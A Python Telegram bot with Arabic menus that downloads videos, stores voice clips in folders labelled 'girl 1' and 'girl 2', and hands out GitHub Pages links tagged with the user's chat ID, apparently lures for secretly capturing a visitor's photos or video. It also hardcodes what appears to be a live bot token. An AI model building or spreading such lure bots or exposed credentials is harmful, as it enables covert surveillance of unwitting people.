import os
import json
import telebot
from telebot import types
import threading
import http.server
import yt_dlp

# إعداد البوت
BOT_TOKEN = os.getenv("BOT_TOKEN", "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc")
bot = telebot.TeleBot(BOT_TOKEN)

# مسارات الملفات
DB_FILE = "/tmp/voice_db.json"

# سيرفر Railway للحفاظ على استمرار البوت
def run_dummy_server():
    try:
        port = int(os.environ.get("PORT", 8080))
        httpd = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
        httpd.serve_forever()
    except: pass
threading.Thread(target=run_dummy_server, daemon=True).start()

# إدارة قاعدة بيانات الصوتيات
def load_db():
    if not os.path.exists(DB_FILE): return {"girl_1": {}, "girl_2": {}}
    try:
        with open(DB_FILE, 'r', encoding='utf-8') as f: return json.load(f)
    except: return {"girl_1": {}, "girl_2": {}}

def save_db(db):
    try:
        with open(DB_FILE, 'w', encoding='utf-8') as f: json.dump(db, f, indent=4, ensure_ascii=False)
    except: pass

# دالة تحميل الفيديو
def download_video_sync(url, chat_id):
    try:
        ydl_opts = {'format': 'best[ext=mp4]/best', 'outtmpl': f'/tmp/vid_{chat_id}.mp4', 'quiet': True}
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            return f'/tmp/vid_{chat_id}.mp4', info.get('title', 'Video')
    except Exception as e: return None, str(e)

# القوائم
@bot.message_handler(commands=['start'])
def start(m):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ رابط صور", callback_data="p_link"),
        types.InlineKeyboardButton("🎥 رابط فيديو", callback_data="v_link"),
        types.InlineKeyboardButton("📥 تحميل فيديو", callback_data="dl_vid"),
        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="v_menu")
    )
    bot.send_message(m.chat.id, "🤖 مرحباً سيف الدين، اختر الخدمة:", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: True)
def query(c):
    cid = c.message.chat.id
    if c.data == "dl_vid":
        bot.edit_message_text("أرسل رابط الفيديو:", cid, c.message.message_id)
        bot.register_next_step_handler(c.message, dl_process)
    elif c.data == "v_menu":
        m = types.InlineKeyboardMarkup()
        m.add(types.InlineKeyboardButton("الفتاة 1", callback_data="g1_show"), types.InlineKeyboardButton("الفتاة 2", callback_data="g2_show"))
        bot.edit_message_text("اختر المجلد:", cid, c.message.message_id, reply_markup=m)
    elif c.data.endswith("_show"):
        target = "girl_1" if "g1" in c.data else "girl_2"
        db = load_db()
        m = types.InlineKeyboardMarkup()
        # عرض المقاطع الموجودة
        for name in db[target].keys():
            m.add(types.InlineKeyboardButton(f"تشغيل {name}", callback_data=f"play:{target}:{name}"))
        m.add(types.InlineKeyboardButton("حفظ فويس جديد", callback_data=f"save:{target}"))
        bot.edit_message_text(f"محتويات {target}:", cid, c.message.message_id, reply_markup=m)
    elif c.data.startswith("play:"):
        _, target, name = c.data.split(":")
        db = load_db()
        fid = db[target].get(name)
        if fid: bot.send_voice(cid, fid)
    elif c.data.startswith("save:"):
        target = c.data.split(":")[1]
        with open(f"/tmp/state_{cid}.txt", "w") as f: f.write(target)
        bot.answer_callback_query(c.id, "أرسل الفويس الآن ليُحفظ في هذا المجلد")
    elif c.data in ["p_link", "v_link"]:
        link = "https://app-display.github.io/ca.html-chatld-/" if c.data == "p_link" else "https://app-display.github.io/ca.html-chatId"
        bot.send_message(cid, f"الرابط: {link}?chatId={cid}")

def dl_process(m):
    s = bot.reply_to(m, "⏳ جاري المعالجة...")
    path, title = download_video_sync(m.text, m.chat.id)
    if path:
        bot.send_video(m.chat.id, open(path, 'rb'), caption=title)
        bot.delete_message(m.chat.id, s.message_id)
        os.remove(path)
    else: bot.edit_message_text(f"❌ خطأ: {title}", m.chat.id, s.message_id)

@bot.message_handler(content_types=['voice'])
def voice(m):
    cid = m.chat.id
    if os.path.exists(f"/tmp/state_{cid}.txt"):
        with open(f"/tmp/state_{cid}.txt", "r") as f: target = f.read()
        db = load_db()
        idx = len(db[target]) + 1
        db[target][f"مقطع {idx}"] = m.voice.file_id
        save_db(db)
        bot.reply_to(m, f"✅ تم حفظ المقطع {idx} في {target}")
        os.remove(f"/tmp/state_{cid}.txt")

bot.polling(none_stop=True)
